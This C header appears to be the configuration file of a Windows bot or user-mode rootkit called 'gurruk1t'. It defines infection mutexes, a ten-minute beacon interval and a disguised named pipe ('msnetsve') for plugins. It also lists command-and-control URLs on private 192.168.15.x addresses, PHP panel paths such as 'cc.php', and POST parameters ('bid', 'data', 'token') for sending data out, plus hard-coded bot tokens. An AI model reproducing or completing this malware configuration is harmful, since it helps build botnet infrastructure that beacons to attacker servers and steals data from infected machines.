#pragma once
#ifndef H_CONFIG
#define H_CONFIG
#ifdef __cplusplus
extern "C" {
#endif


#define VX_MUTEX	L"j3nnyL4B!cr1m3"
#define MUTEX_NAME	L"4aL4B!gurruk1t"
#define BOT_SLEEP	10					//mins
#define USER_AGENT	L"gurruk1t ring3 rootkit"

#define EXTERNAL_INPUT // Use only in case of plugins or input information from external process
#ifdef EXTERNAL_INPUT
	#define IN_PIPE_NAME L"\\.\pipe\msnetsve"
#endif


wchar_t * urls[] = {
								L"http://192.168.15.21:80",
								L"https://192.168.15.120:443",
								NULL
							};

wchar_t *hosts[] = {
								L"192.168.15.21",
								NULL
					};


wchar_t * paths[] = {
								L"cc.php",
								L"fqwrfas.php",
								NULL
					};

wchar_t * vars[] = {
								L"bid=",
								L"&data=",
								L"&token=",
								NULL
					};

wchar_t * bots_unique_tokens[] = {
								L"23421341234daf234132",
								L"df2342332i4h234ih324",
								NULL
							};






#ifdef __cplusplus
}
#endif
#endif